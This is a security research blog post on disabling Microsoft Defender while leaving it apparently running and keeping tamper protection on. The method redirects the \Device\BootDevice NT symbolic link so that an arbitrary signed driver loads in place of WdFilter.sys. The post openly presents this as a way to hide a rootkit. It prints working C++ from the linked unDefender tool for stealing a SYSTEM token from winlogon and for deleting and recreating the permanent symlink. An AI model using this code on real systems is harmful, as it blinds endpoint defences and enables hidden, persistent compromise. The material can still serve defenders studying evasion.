---
layout: post
title: The dying knight in the shiny armour
subtitle: Killing Defender through NT symbolic links redirection while keeping it unbothered
author:
- last
---
### TL;DR
With Administrator level privileges and without interacting with the GUI, it's possible to prevent Defender from doing its job while keeping it alive and without disabling tamper protection by redirecting the \Device\BootDevice NT symbolic link which is part of the NT path from where Defender's WdFilter driver binary is loaded. This can also be used to make Defender load an arbitrary driver, which no tool succeeds in locating. The code to do that is in APTortellini's Github repository [unDefender](https://github.com/APTortellini/unDefender)
### Introduction
Some time ago I had a chat with [jonasLyk](LINK_HERE) of the [Secret Club](secret.club) hacker collective about [a technique he devised](LINK_TO_TWEET) to disable Defender without making it obvious it was disabled and/or invalidating its tamper protection feature. What I liked about this technique was that it employed some really clever NT symbolic links shenanigans I'll try to outline in this blog post (which, coincidentally, is also the first one of the Advanced Persistent Tortellini collective :D). Incidentally, this techniques makes for a great way to hide a rootkit inside a Windows system, as Defender can be tricked into loading an arbitrary driver (that, sadly, has to be signed) and no tool is able to pinpoint it, as you'll be able to see in a while. Grab a beer, and enjoy the ride lads!
### Win32 paths, NT paths and NT symbolic links
When loading a driver in Windows there are two ways of specifying where on the filesystem the driver binary is located: Win32 paths and NT paths. A complete analysis of the subtle differences between these two kinds of paths is out of the scope of this article, but [James Forshaw already did a great job at explaining it](https://googleprojectzero.blogspot.com/2016/02/the-definitive-guide-on-win32-to-nt.html). Essentially, Win32 paths are a dumbed down version of the more complete NT paths and heavily rely on NT symbolic links. Win32 paths are the familiar path we all use everyday, the ones with letter drives, while NT paths use a different tree structure on which Win32 paths are mapped. Let's look at WdFilter's specific example:

| Win32 path                                 | NT Path                                                         |
| :----------------------------------------- | :-------------------------------------------------------------- |
| C:\Windows\System32\Driver\wd\WdFilter.sys | \Device\HarddiskVolume4\Windows\System32\Driver\wd\WdFilter.sys |

When using explorer.exe to navigate the folders in the filesystem we use Win32 paths and in fact the path you see in the table above is exactly the path in which you can find WdFilter.sys, though it's just an abstraction layer as the kernel really uses NT paths to work and Win32 paths are translated to NT paths before being consumed by the OS.  
  
To make things a bit more complicated, NT paths can make use of NT symbolic links, just as there are symbolic links in Win32 paths. In fact, drive letters like C: and D: are actually NT symbolic links to NT paths: as you can see in the table above, on my machine C: is a NT symbolic link to the NT path \Device\HarddiskVolume4. A number of NT symbolic links is used for various purposes, one of them is to specify the path of certain drivers, like WdFilter for example: by querying it using the CLI we can see the path from which it's loaded:

![sc.exe qc wdfilter]({{site.baseurl}}/img/wdfilterpath.PNG)

As you can see it's not the one we showed in the table above, as \SystemRoot is a NT symbolic link. Using SysInternals' Winobj.exe we can see that \SystemRoot points to \Device\BootDevice\Windows. \Device\BootDevice is itself another symbolic link to, at least for my machine, \Device\HarddiskVolume4. Like all objects in the Windows kernel, NT symbolic links' security is subordinated to ACL. Let's inspect them:

![symlink acl]({{site.baseurl}}/img/symlinkacl.PNG)

As you can see, SYSTEM (and Administrators) don't have READ/WRITE privilege on the NT symbolic link \SystemRoot (although we can query it and see where it points to), but they have the DELETE privilege. Factor in the fact SYSTEM can create new NT symbolic links and you get yourself the ability to actually change the NT symbolic link: just delete it and recreate it pointing it to something you control. The same applies for other NT symbolic links, \Device\BootDevice included. To actually rewrite this kind of symbolic link we need to use native APIs as there are no Win32 APIs for that.
### The code
I'll walk you through some code snippets from our project [unDefender](https://github.com/APTortellini/unDefender) which abuses this behaviour. Here's a flowchart of how the different pieces of the software work:

![unDefender flowchart]({{site.baseurl}}/img/undefenderFlowchart.PNG)

All the functions used in the program are defined in the common.h header. Here you will also find definitions of the Nt functions I had to dynamically load from ntdll. Note that I wrap the HANDLE, HMODULE and SC\_HANDLE types in custom types part of the RAII namespace as I heavily rely on C++'s [RAII paradigm](https://en.wikipedia.org/wiki/Resource_acquisition_is_initialization) in order to safely handle these types. These custom RAII types are defined in the raii.h header and implemented in their respective .cpp files.
#### Getting SYSTEM
First things first, we elevate our token to a SYSTEM one. This is easily done through the GetSystem function, implemented in the GetSystem.cpp file. Here we basically open winlogon.exe, a SYSTEM process running unprotected in every Windows session,  using the OpenProcess API. After that we open its token, through OpenProcessToken, and impersonate it using ImpersonateLoggedOnUser, easy peasy. 

```C++
#include "common.h"

bool GetSystem()
{
	RAII::Handle winlogonHandle = OpenProcess(PROCESS_ALL_ACCESS, false, FindPID(L"winlogon.exe"));
	if (!winlogonHandle.GetHandle())
	{
		std::cout << "[-] Couldn't get a PROCESS_ALL_ACCESS handle to winlogon.exe, exiting...\n";
		return false;
	}
	else std::cout << "[+] Got a PROCESS_ALL_ACCESS handle to winlogon.exe!\n";

	HANDLE tempHandle;
	auto success = OpenProcessToken(winlogonHandle.GetHandle(), TOKEN_QUERY | TOKEN_DUPLICATE, &tempHandle);
	if (!success)
	{
		std::cout << "[-] Couldn't get a handle to winlogon.exe's token, exiting...\n";
		return success;
	}
	else std::cout << "[+] Opened a handle to winlogon.exe's token!\n";
	RAII::Handle tokenHandle = tempHandle;
	
	success = ImpersonateLoggedOnUser(tokenHandle.GetHandle());
	if (!success)
	{
		std::cout << "[-] Couldn't impersonate winlogon.exe's token, exiting...\n";
		return success;
	}
	else std::cout << "[+] Successfully impersonated winlogon.exe's token, we are SYSTEM now ;)\n";
	return success;
}
```
#### Saving the symbolic link current state
After getting SYSTEM we need to backup the current state of the symbolic link, so that we can programmatically restore it later. This is done through the GetSymbolicLinkTarget implemented in the GetSymbolicLinkTarget.cpp file. After resolving the address of the Nt functions (skipped in the following snippet) we define two key data structures: a UNICODE\_STRING and an OBJECT\_ATTRIBUTES. These two are initialized through RtlInitUnicodeString and InitializeObjectAttributes. The UNICODE\_STRING is initialized using the symLinkName variable, which is of type std::wstring and is one of the arguments passed to GetSymbolicLinkTarget by the main function. The first one is a structure the Windows kernel uses to work with unicode strings (duh!) and is necessary for initializing the second one, which in turn is used to open a handle to the NT symlink using NtOpenSymbolicLinkObject with GENERIC\_READ access. Before that though we define a HANDLE which will be filled by NtOpenSymbolicLinkObject itself and that we will assign to the corresponding RAII type (I have yet to implement a way of doing it directly without using a temporary disposable variable, I'm lazy).

Done that we proceed to initialize a second UNICODE\_STRING which will be used to store the symlink target retrieved by NtQuerySymbolicLinkObject, which takes as arguments the RAII::Handle we initialized before, the second UNICODE\_STRING we just initialized and a nullptr as we don't care about the bytes read. Done that we return the buffer of the second UNICODE\_STRING and call it a day.
```C++
UNICODE_STRING symlinkPath;
RtlInitUnicodeString(&symlinkPath, symLinkName.c_str());
OBJECT_ATTRIBUTES symlinkObjAttr{};
InitializeObjectAttributes(&symlinkObjAttr, &symlinkPath, OBJ_KERNEL_HANDLE, NULL, NULL);
HANDLE tempSymLinkHandle;

NTSTATUS status = NtOpenSymbolicLinkObject(&tempSymLinkHandle, GENERIC_READ, &symlinkObjAttr);
RAII::Handle symLinkHandle = tempSymLinkHandle;

UNICODE_STRING LinkTarget{};
wchar_t buffer[MAX_PATH] = { L'\0' };
LinkTarget.Buffer = buffer;
LinkTarget.Length = 0;
LinkTarget.MaximumLength = MAX_PATH;

status = NtQuerySymbolicLinkObject(symLinkHandle.GetHandle(), &LinkTarget, nullptr);
if (!NT_SUCCESS(status))
{
    Error(RtlNtStatusToDosError(status));
    std::wcout << L"[-] Couldn't get the target of the symbolic link " << symLinkName << std::endl;
    return L"";
}
else std::wcout << "[+] Symbolic link target is: " << LinkTarget.Buffer << std::endl;
return LinkTarget.Buffer;
```

#### Changing the symbolic link
Now that we have stored the older symlink target it's time we change it. To do so we once again setup the two UNICODE\_STRING and OBJECT\_ATTRIBUTES structures that will identify the symlink we want to target and then call the native function NtOpenSymbolicLink to get a handle to said symlink with DELETE privileges.

```C++
UNICODE_STRING symlinkPath;
RtlInitUnicodeString(&symlinkPath, symLinkName.c_str());
OBJECT_ATTRIBUTES symlinkObjAttr{};
InitializeObjectAttributes(&symlinkObjAttr, &symlinkPath, OBJ_KERNEL_HANDLE, NULL, NULL);
HANDLE symlinkHandle;

NTSTATUS status = NtOpenSymbolicLinkObject(&symlinkHandle, DELETE, &symlinkObjAttr);
```

After that, we proceed to delete the symlink. To do that we first have to call NtMakeTemporaryObject and pass it the handle to the symlink we just got. That's because this kind of symlinks are created with the OBJ_PERMANENT attribute, which increases the reference counter of their kernel object in kernelspace by 1. This means that even if all handles to the symbolic link are closed, the symbolic link will continue to live in the kernel object manager. So, in order to delete it we have to make the object no longer permanent (hence temporary), which means NtMakeTemporaryObject simply decreases the reference counter by one. When we call CloseHandle after that on the handle of the symlink, the reference counter goes to zero and the object is destroyed:

```C++
status = NtMakeTemporaryObject(symlinkHandle);
CloseHandle(symlinkHandle);
```

Once we have deleted the symlink it's time to recreate it and make it point to the new target. This is done by initializing again a UNICODE\_STRING and a OBJECT\_ATTRIBUTES and calling NtCreateSymbolicLinkObject:
```C++
UNICODE_STRING target;
RtlInitUnicodeString(&target, newDestination.c_str());
UNICODE_STRING newSymLinkPath;
RtlInitUnicodeString(&newSymLinkPath, symLinkName.c_str());
OBJECT_ATTRIBUTES newSymLinkObjAttr{};
InitializeObjectAttributes(&newSymLinkObjAttr, &newSymLinkPath, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL);
HANDLE newSymLinkHandle;

status = NtCreateSymbolicLinkObject(&newSymLinkHandle, SYMBOLIC_LINK_ALL_ACCESS, &newSymLinkObjAttr, &target);
if (status != STATUS_SUCCESS)
{
	std::wcout << L"[-] Couldn't create new symbolic link " << symLinkName << L" to " << newDestination << L". Error:0x" << std::hex << status << std::endl;
	return status;
}
else std::wcout << L"[+] Symbolic link " << symLinkName << L" to " << newDestination << L" created!" << std::endl;
CloseHandle(newSymLinkHandle);
return STATUS_SUCCESS;
```

Note two things:
1. when calling InitializeObjectAttributes we pass the OBJ_PERMANENT attribute as argument, so that the symlink is created as permanent, in order to avoid having the symlink destroyed when unDefender exits;
2. right before returning STATUS_SUCCESS we call CloseHandle on the newly created symlink. This is necessary because if the handle stays open the reference counter of the symlink will be 2 (1 for the handle, plus 1 for the OBJ\_PERMANENT) and we won't be able to delete it later when we will try to restore the old symlink.  

At this point the symlink is changed and points to a location we have control on. In this location we will have constructed a directory tree which mimicks WdFilter's one and copied our arbitrary driver, conveniently renamed WdFilter.sys - we do it in the first line of the main function through a series of system() function calls. I know it's uncivilized to do it this way, deal with it.
